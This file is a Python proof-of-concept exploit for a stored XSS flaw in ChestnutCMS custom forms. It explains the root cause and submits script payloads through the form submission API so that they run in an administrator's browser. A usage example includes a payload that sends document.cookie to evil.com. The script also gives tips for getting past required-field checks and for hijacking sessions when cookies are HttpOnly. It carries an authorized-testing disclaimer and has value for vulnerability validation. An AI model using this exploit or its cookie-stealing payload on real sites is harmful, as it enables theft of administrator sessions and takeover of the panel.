#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: ChestnutCMS Custom Form Stored XSS
=======================================

Vulnerability Overview
----------------------
- Entry point: POST /api/customform/submit
- Root cause: The backend applies no HTML filtering to rich-text fields whose
              controlType='UEditor'
              (CustomFormApiServiceImpl.submit -> ModelDataServiceImpl.saveModelData,
               UEditor control type falls back to the default valueAsString -> obj.toString())
- Trigger: Admin backend "Custom Form Data" page, data.vue line 87
           <div class="rich-content" v-html="scope.row[field.code]"></div>
           renders the stored content directly, leading to stored XSS that can
           steal admin cookies / hijack the admin panel.

Authorization Notice
--------------------
This script is intended solely for security testing and vulnerability validation
on ChestnutCMS deployments that you own or are authorized to test.
Do not use it against any unauthorized target. The user bears all legal responsibility.

Dependency: pip install requests

Usage Examples
--------------
# 1) Target form without captcha and login (most common, default):
python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content

# 2) Custom XSS payload:
python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content \
    -p '<img src=x onerror=fetch("https://evil.com/c?"+document.cookie)>'

# 3) Inject multiple UEditor fields at once:
python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content -F remark
"""

import argparse
import sys
import uuid as uuidlib

try:
    import requests
except ImportError:
    sys.exit("[-] Missing dependency 'requests', please install it first: pip install requests")

# ---------------------------------------------------------------------------
# Key constant: from source CustomFormConsts.PARAMETER_UUID = "cc-uuid"
# The UUID is passed only via header/parameter cc-uuid (or parameter uuid);
# it is never read from Cookie or request body.
# ---------------------------------------------------------------------------
SUBMIT_PATH = "/api/customform/submit"

DEFAULT_PAYLOAD = '<img src=x onerror="alert(document.cookie)">'


def log(msg):
    print(f"[*] {msg}")


def ok(msg):
    print(f"[+] {msg}")


def warn(msg):
    print(f"[!] {msg}")


def err(msg):
    print(f"[-] {msg}", file=sys.stderr)


def submit(base_url, form_id, fields):
    """
    Submit the form data.
    """
    url = base_url + SUBMIT_PATH
    headers = {
        "Content-Type": "application/json; charset=utf-8",
        "cc-uuid": "123"
    }
    payload = {"formId": form_id}
    payload.update(fields)

    resp = requests.post(url, headers=headers, json=payload)
    try:
        body = resp.json()
    except ValueError:
        body = {"code": resp.status_code, "msg": resp.text[:200]}
    return resp.status_code, body


def parse_field_args(field_args):
    """Parse -F/--field arguments. Supports 'code' or 'code:TYPE'; returns the list of field codes."""
    codes = []
    for fa in field_args:
        code = fa.split(":", 1)[0].strip()
        if code:
            codes.append(code)
    return codes


def main():
    parser = argparse.ArgumentParser(
        description="ChestnutCMS Custom Form Stored XSS PoC (testing only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python poc_customform_xss.py -t http://localhost:9080 -f 1 -F content",
    )
    parser.add_argument("-t", "--target", required=True,
                        help="Target base URL, e.g. http://localhost:8080 (include the site prefix if any)")
    parser.add_argument("-f", "--form-id", required=True, type=int,
                        help="Custom form ID (formId)")
    parser.add_argument("-F", "--field", action="append", required=True, metavar="CODE",
                        help="UEditor field code; may be specified multiple times to inject multiple fields")
    parser.add_argument("-p", "--payload", default=DEFAULT_PAYLOAD,
                        help="XSS payload (default: alert probe)")
    parser.add_argument("--extra", action="append", default=[], metavar="CODE=VAL",
                        help="Additional normal fields to bypass required validation, e.g. --extra name=test")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    session_uuid = uuidlib.uuid4().hex

    field_codes = parse_field_args(args.field)
    inject = {code: args.payload for code in field_codes}
    for kv in args.extra:
        if "=" not in kv:
            err(f"--extra format should be CODE=VAL: {kv}")
            sys.exit(1)
        k, v = kv.split("=", 1)
        inject[k] = v

    print("=" * 64)
    print(" ChestnutCMS Custom Form Stored XSS PoC  (authorized testing only)")
    print("=" * 64)
    log(f"Target: {base_url}")
    log(f"formId={args.form_id}  session uuid={session_uuid}")
    log(f"Inject fields: {field_codes}")
    log(f"Payload: {args.payload}")

    # ---- Submit the malicious payload ----
    try:
        status, body = submit(base_url, args.form_id, inject)
    except Exception as e:
        err(f"Submit request error: {e}")
        sys.exit(1)

    log(f"HTTP {status}  response: {body}")
    code = body.get("code")
    msg = str(body.get("msg"))

    if code == 200:
        print()
        ok("Submit succeeded: the malicious payload has been written to the database.")
        ok("Trigger path: admin logs into the backend -> CMS -> Custom Form -> Data Management "
           f"(formId={args.form_id}) -> click the view icon (eye) on the rich-text field -> XSS executes")
        warn("If session cookies are HttpOnly, document.cookie may be inaccessible; "
             "use a payload that calls a backend API / phishing to verify execution.")
        sys.exit(0)
    else:
        err(f"Submit failed: code={code}, msg={msg}")
        # Keys match Chinese keywords returned by the server; values are user-facing hints.
        hints = {
            "验证码": "Captcha answer is incorrect, or the form has captcha enabled, add --captcha",
            "captcha": "Captcha answer is incorrect, or the form has captcha enabled, add --captcha",
            "登录": "The form requires login (needLogin=Yes), obtain a member login credential first before submitting",
            "必填": "A required field was bypassed, fill it in with --extra",
        }
        for k, v in hints.items():
            if k in msg:
                warn("Hint: " + v)
        sys.exit(1)


if __name__ == "__main__":
    main()
